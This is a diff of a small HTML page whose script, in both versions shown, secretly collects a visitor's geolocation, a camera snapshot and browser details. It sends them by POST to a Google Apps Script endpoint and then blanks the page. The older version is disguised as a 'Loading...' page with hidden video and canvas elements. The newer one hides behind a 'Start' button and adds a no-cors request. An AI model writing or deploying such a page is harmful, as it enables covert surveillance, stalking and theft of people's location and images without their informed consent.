@@ -1,62 +1,52 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
-</head>
 <body>
 
-<video id="v" autoplay playsinline style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<button onclick="start()">Start</button>
 
 <script>
-const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzyTH3TCuXpXtEcy55bfzOEq1GHijAOk5-VhZ5S7i9aO_Wyb_xakYy-1mHISYshIj-1/exec";
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxu2IpxTYTBE5miAhNS9EIBhC07iO6L4kaW9KyP9Uj3Te8RYUaSTkrarTjMIbu0O6V_aQ/exec";
 
-(async () => {
-  try {
-    // 📍 Location
-    const pos = await new Promise((res, rej) =>
-      navigator.geolocation.getCurrentPosition(res, rej)
-    );
+async function start() {
 
-    // 📷 Camera
+  // LOCATION
+  navigator.geolocation.getCurrentPosition(async pos => {
+
+    // CAMERA
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById("v");
+    const video = document.createElement("video");
     video.srcObject = stream;
+    await video.play();
 
-    await new Promise(r => setTimeout(r, 1500));
-
-    const canvas = document.getElementById("c");
+    const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext("2d").drawImage(video, 0, 0);
 
-    const photo = canvas.toDataURL("image/jpeg");
-
     stream.getTracks().forEach(t => t.stop());
 
-    // 📤 Send data
+    const photo = canvas.toDataURL("image/jpeg");
+
+    const payload = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      device: navigator.userAgent,
+      photo: photo
+    };
+
+    // 🔴 IMPORTANT FIX
     fetch(WEB_APP_URL, {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        device: navigator.userAgent,
-        photo: photo
-      })
+      mode: "no-cors",
+      body: JSON.stringify(payload)
     });
 
-    // 🕵️ Blank page
+    // 🕵️ Make page blank
     document.body.innerHTML = "";
 
-  } catch (e) {
-    console.log("Permission denied or error");
-  }
-})();
+  });
+}
 </script>
 
 </body>
 </html>
-
-
